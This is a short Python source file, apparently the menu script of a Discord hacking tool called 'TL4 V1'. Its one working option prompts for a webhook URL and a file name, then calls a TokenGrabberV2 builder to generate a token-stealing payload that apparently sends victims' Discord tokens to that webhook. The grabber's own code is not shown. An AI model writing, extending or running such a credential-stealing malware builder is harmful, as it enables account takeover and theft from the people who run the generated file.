import os
from time import sleep
import colorama
from colorama import Fore, Style, init
colorama.init(autoreset=True)
import os
from dhooks import Webhook
from util.banner import banners
from util.plugins.common import *
import util
from util.create_token_grabber import TokenGrabberV2

os.system('title TL4 V1')
def main():
    print(banners)
    print("")
    print("")
    print("")
    optionss = input(f"{Fore.RED}              [{Fore.WHITE}>{Fore.RED}]")
    if optionss == '6':
        WebHook = input(f'       {Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.RESET}Webhook Url: {Fore.RED}')
        validateWebhook(WebHook)
        fileName = str(input(f'  {Fore.RED}[{Fore.WHITE}>{Fore.RED}] {Fore.RESET}File name: {Fore.RED}'))
        util.create_token_grabber.TokenGrabberV2(WebHook, fileName)
        print("")
        input("Press anything to get to the main menu.. ")
        os.system('cls')
        sleep(0.1)
        main()
os.system('cls')
sleep(0.1)
main()